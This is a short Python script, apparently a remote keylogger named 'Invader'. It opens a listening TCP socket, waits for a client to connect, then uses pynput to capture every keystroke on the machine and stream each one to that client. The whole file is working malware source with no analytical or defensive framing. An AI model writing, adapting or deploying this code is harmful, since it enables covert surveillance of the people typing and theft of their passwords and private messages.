import json
import socket
from pathlib import Path
from pynput import mouse, keyboard
import threading, queue


class Invader:
    def __init__(self):

        self.keysQueue = queue.Queue()
        self.Stop = False
        self.conn = None

        config_path = Path(__file__).with_name('config.json')
        with config_path.open('r', encoding='utf-8') as f:
            config = json.load(f)

        HOST = config['HOST']
        PORT = config['PORT']

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()

            self.conn, addr = s.accept()

            Detect = threading.Thread(target=self.GetKey)
            Detect.start()

    def OnPress(self, key):
        try:
           KeyChat = key.char.encode()
           self.conn.sendall(len(KeyChat).to_bytes(1, "big") + KeyChat)
        except AttributeError:
            SpKeyChat = str(key).encode()
            self.conn.sendall(len(SpKeyChat).to_bytes(1, "big") + SpKeyChat)

    def GetKey(self):
        with keyboard.Listener(on_press=self.OnPress) as listener:
            listener.join()

if __name__ == "__main__":
    I = Invader()
